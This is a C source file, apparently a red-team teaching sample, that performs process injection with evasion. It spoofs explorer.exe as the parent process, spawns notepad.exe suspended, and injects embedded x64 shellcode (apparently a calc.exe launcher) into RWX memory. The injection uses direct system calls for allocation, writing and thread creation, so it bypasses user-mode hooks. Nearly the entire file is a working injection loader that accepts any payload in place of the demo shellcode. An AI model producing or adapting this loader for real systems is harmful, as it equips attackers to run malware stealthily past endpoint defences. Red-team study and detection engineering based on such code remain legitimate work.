/*
* ml64.exe /c direct-syscalls.asm
* cl.exe direct-syscalls-eb.c ..\includes\ps-utils.c direct-syscalls.obj /Fe:direct-syscalls.exe
*/
#include <stdio.h>
#include <windows.h>
#include "..\includes\ps-utils.h"
#include "..\includes\peb-eat-utils.h"
#include "..\includes\syscall-utils.h"

// https://ntdoc.m417z.com/NtAllocateVirtualMemory
NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,    
    PVOID* BaseAddress,      
    ULONG_PTR ZeroBits,      
    PSIZE_T RegionSize,      
    ULONG AllocationType,    
    ULONG Protect            
);

// https://ntdoc.m417z.com/ntprotectvirtualmemory
NTSTATUS SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtection,
    PULONG OldProtection
);

// https://ntdoc.m417z.com/NtWriteVirtualMemory
NTSTATUS SysNtWriteVirtualMemory(
    HANDLE ProcessHandle,     
    PVOID BaseAddress,        
    PVOID Buffer,             
    SIZE_T NumberOfBytesToWrite, 
    PSIZE_T NumberOfBytesWritten 
);

// https://ntdoc.m417z.com/ntcreatethreadex
NTSTATUS SysNtCreateThreadEx(
    PHANDLE ThreadHandle,        
    ACCESS_MASK DesiredAccess,   
    PVOID ObjectAttributes,      
    HANDLE ProcessHandle,        
    PVOID lpStartAddress,        
    PVOID lpParameter,           
    ULONG Flags,                 
    SIZE_T StackZeroBits,        
    SIZE_T SizeOfStackCommit,    
    SIZE_T SizeOfStackReserve,   
    PVOID lpBytesBuffer          
);

// https://ntdoc.m417z.com/ntwaitforsingleobject
NTSTATUS SysNtWaitForSingleObject(
    HANDLE Handle,          
    BOOLEAN Alertable,      
    PLARGE_INTEGER Timeout  
);

// https://ntdoc.m417z.com/ntqueueapcthread
NTSTATUS SysNtQueueApcThread(
    HANDLE ThreadHandle,
    LPVOID ApcRoutine, // RtlDispatchAPC
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

// https://ntdoc.m417z.com/ntresumethread
NTSTATUS SysNtResumeThread(    
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);

int main(int argc, char* argv[]) {
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    // Setup PPID Spoofing
    STARTUPINFOEXA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize = 0;

    DWORD parentPid = FindPidByName(L"explorer.exe");
    if (parentPid == 0) {
        printf("[!] Failed to resolve explorer.exe PID.\n");
        return FALSE;
    }

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (!hParent) {
        printf("[!] Failed to open Explorer handle: %d\n", GetLastError());
        return FALSE;
    }

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    DWORD startupFlags = EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED;
    
    // spawn a target process
    if (!CreateProcessA(NULL, "c:\\windows\\system32\\notepad.exe", NULL, NULL, FALSE, startupFlags, NULL, NULL, &si.StartupInfo, &pi)) {
        printf("[!] CreateProcess failed: %d\n", GetLastError());
        return FALSE;
    }                

    printf("[+] %s spawned (PID: %d) with spoofed Explorer PPID (PPID: %d)\n", "c:\\windows\\system32\\notepad.exe", pi.dwProcessId, parentPid);

    // Open a handle to the current process, this must be passed to VirtualAllocEx
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
    if (pHandle == NULL) {
        printf("Failed to acquire process handle!\n");
        return -1;
    }

    printf("[*] Successfully opened handle to PID: %u\n", pi.dwProcessId);

    // Clean up the attribute list allocation
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    // Close the hande used for PPID spoofing
    CloseHandle(hParent);

    PPEB pPeb = (PPEB)__readgsqword(0x60);

    printf("[*] Running allocation with SysNtAllocateVirtualMemory.\n");
    PVOID bufferAddress = NULL;
	SIZE_T buffSize = sizeof(buf); 
    SysNtAllocateVirtualMemory(pHandle, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    printf("[*] Writing buffer with SysNtWriteVirtualMemory.\n");
	SIZE_T bytesWritten;
    SysNtWriteVirtualMemory(pHandle, bufferAddress, buf, sizeof(buf), &bytesWritten);

    printf("[*] Creating thread with SysNtCreateThreadEx.\n");
	HANDLE hThread;	
	SysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pHandle, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);

    printf("[*] Waiting for thread with SysNtWaitForSingleObject.\n");
	SysNtWaitForSingleObject(hThread, FALSE, NULL);
    printf("[+] Process injection complete.\n");
    return 0;
}